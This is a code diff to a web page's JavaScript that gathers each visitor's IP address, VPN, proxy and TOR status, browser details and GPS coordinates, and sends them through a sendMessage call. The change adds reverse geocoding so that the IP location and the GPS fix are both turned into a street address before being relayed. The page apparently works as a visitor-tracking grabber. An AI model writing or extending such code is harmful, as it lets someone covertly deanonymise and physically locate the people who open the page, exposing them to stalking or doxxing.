@@ -46,9 +46,19 @@
       });
     };
 
+    const reverseGeocode = async (lat, lon) => {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+      const data = await res.json();
+      return data.display_name || 'Unknown address';
+    };
+
     const getInfo = async () => {
       try {
         const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        const ipAddress = ipData.ip;
+        const ipLat = ipData.latitude;
+        const ipLon = ipData.longitude;
+        const ipAddressLookup = await reverseGeocode(ipLat, ipLon);
 
         const browserInfo = `🧭 Browser Info:
 • Locale: ${navigator.language}
@@ -59,7 +69,7 @@
 • Device Type: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
 
         const ipInfo = `🌍 IP-Based Info:
-• IP: ${ipData.ip}
+• IP: ${ipAddress}
 • Country: ${ipData.country_name}
 • Region: ${ipData.region}
 • City: ${ipData.city}
@@ -67,38 +77,42 @@
 • Proxy: ${ipData.proxy ? 'Yes' : 'No'}
 • VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
 • TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
-• Latitude: ${ipData.latitude}
-• Longitude: ${ipData.longitude}
-• Address: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+• Latitude: ${ipLat}
+• Longitude: ${ipLon}
+• Address: ${ipAddressLookup}`;
 
-        const combinedInfo = `${browserInfo}\n\n${ipInfo}`;
+        const baseInfo = `${browserInfo}\n\n${ipInfo}`;
 
         const permission = await navigator.permissions.query({ name: 'geolocation' });
 
         if (permission.state === 'granted') {
-          navigator.geolocation.getCurrentPosition(pos => {
+          navigator.geolocation.getCurrentPosition(async pos => {
             const geo = pos.coords;
+            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
             const geoInfo = `📍 Geolocation (Permission Already Granted):
 • Latitude: ${geo.latitude}
 • Longitude: ${geo.longitude}
-• Accuracy: ±${geo.accuracy} meters`;
+• Accuracy: ±${geo.accuracy} meters
+• Address: ${gpsAddress}`;
 
-            sendMessage(`${combinedInfo}\n\n${geoInfo}`);
+            sendMessage(`${baseInfo}\n\n${geoInfo}`);
           }, () => {
-            sendMessage(`${combinedInfo}\n\n⚠️ Failed to retrieve geolocation.`);
+            sendMessage(`${baseInfo}\n\n⚠️ Failed to retrieve geolocation.`);
           });
         } else {
-          sendMessage(combinedInfo);
+          sendMessage(baseInfo);
 
-          navigator.geolocation.getCurrentPosition(pos => {
+          navigator.geolocation.getCurrentPosition(async pos => {
             const geo = pos.coords;
+            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
             const geoInfo = `📍 Geolocation (Permission Just Granted):
 • Latitude: ${geo.latitude}
 • Longitude: ${geo.longitude}
-• Accuracy: ±${geo.accuracy} meters`;
+• Accuracy: ±${geo.accuracy} meters
+• Address: ${gpsAddress}`;
 
             sendMessage(geoInfo);
-          }, (err) => {
+          }, err => {
             if (err.code === 1) {
               sendMessage('❌ User denied geolocation access.');
             } else {
